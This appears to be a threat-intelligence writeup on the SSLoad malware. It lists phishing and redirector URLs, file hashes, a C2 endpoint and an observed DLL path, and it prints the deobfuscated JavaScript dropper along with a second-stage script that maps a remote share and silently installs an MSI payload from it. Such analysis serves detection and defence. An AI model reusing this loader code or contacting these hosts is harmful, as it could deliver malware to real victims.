
THREAT IDENTIFICATION: SSLOAD

URLS FROM THE EMAIL
https://adss-health.com/wp-content/plugins/hot-random-image/index.html
https://goktepemakina.com/wp-content/plugins/hot-random-image/index.html
https://observer000.com/wp-content/plugins/hot-random-image/index.html
https://prominencedigiworld.com/wp-content/plugins/hot-random-image/index.html
https://rummyking24.com/wp-content/plugins/hot-random-image/index.html
https://www.prottahobarta.com/wp-content/plugins/hot-random-image/index.html
https://www.mlmigration.com/wp-content/plugins/hot-random-image/index.html
https://iespppomabamba.edu.pe/wp-content/plugins/hot-random-image/index.html
https://akshayascientifics.com/wp-content/plugins/hot-random-image/index.html

REDIRECTOR URLS
https://corsproxy.io/?https%3A%2F%2Fpastebin.com%2Fraw%2Fi18MwXC2
(Paste contains the next url)

FILTER/FORWARD URL
https://qogmjlm.org/

DECOY PDF URL
https://www.documentcloud.org/documents/516591-invoice-1-13528347057540-_-pdf

JAVASCRIPT FILE HASH
Letter_o40_58g357086-56q83656a4371-9752z1.js
64e9b99d80a268eaaf1a8569802e7f70
SHA1: ef9dbcbdce9bebb64617c4b077ffc79ddd5aa4c6

DEOBFUSCATED JAVASCRIPT FILE CONTENTS
var a = (function () {
var b = new ActiveXObject('Scripting.FileSystemObject'),
c = WScript.ScriptFullName,
d = ''
function e() {
if (!b.FileExists(c)) {
return
}
var f = b.OpenTextFile(c, 1)
while (!f.AtEndOfStream) {
var g = f.ReadLine()
if (g.slice(0, 8) === '////////') {
d += g.substr(8) + '\n'
}
}
f.Close()
}
function h() {
if (d !== '') {
var i = new Function(d)
i()
}
}
return {
j: function () {
try {
e()
h()
} catch (k) {}
},
}
})()
a.j()

EXTRACTED SECOND SCRIPT
var network = new ActiveXObject("WScript.Network");
var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
var attempt = 0;
var connected = false;
var driveLetter, letter;

function isDriveMapped(letter) {
    var drives = network.EnumNetworkDrives();
    for (var i = 0; i < drives.length; i += 2) {
        if (drives.Item(i) === letter) {
            return true;
        }
    }
    return false;
}

for (driveLetter = 90; driveLetter >= 65 && !connected; driveLetter--) {
    letter = String.fromCharCode(driveLetter) + ":";
    if (!isDriveMapped(letter)) {
        try {
            network.MapNetworkDrive(letter, "\\\\krd6.com@80\\share\\");
            connected = true;
            break;
        } catch (e) {
            attempt++;
        }
    }
}

if (!connected && attempt > 5) {
    var command = 'net use ' + letter + ' \\\\krd6.com@80\\share\\ /persistent:no';
    wmi.Get("Win32_Process").Create(command, null, null, null);

    var startTime = new Date();
    while (new Date() - startTime < 3000) {} 

    connected = isDriveMapped(letter);
}

if (connected) {
    var installCommand = 'msiexec.exe /i \\\\krd6.com@80\\share\\avp.msi /qn';
    wmi.Get("Win32_Process").Create(installCommand, null, null, null);

    try {
        network.RemoveNetworkDrive(letter, true, true);
    } catch (e) {
        
    }
} else {
    WScript.Echo("Failed.");
}
            if (g.slice(0, 8) === "") d += g.substr(8) + "\n";


NEXT STAGE FILE SHARE AND DOWNLOAD
\\krd6.com@80\\share\\avp.msi

MSI FILE HASH
avp.msi
4d81be09c23e02fab7364e508c21c111
SHA1: 52cae521d7a808c8206f4b5afd6b037bc573b50e

OBSERVED TRAFFIC
http://85.239.53.219/api/gateway

SSLOAD C2
POST http://85.239.53.219/api/9b847f02-e544-95ad-b351-26db2a9ef97f/tasks

ADDITIONAL TRAFFIC OBSERVED
api.ipify.org

ADDITIONAL DLL FOUND
C:\Users\analyst\AppData\Local\sharepoint\forcedelctl.dll

DLL FILE HASH
forcedelctl.dll
b28a478eb5b99efcdc7caf428bffb89a
SHA1: d394c7b8fe15753bfbff79fb4f648f6f8bae70f9


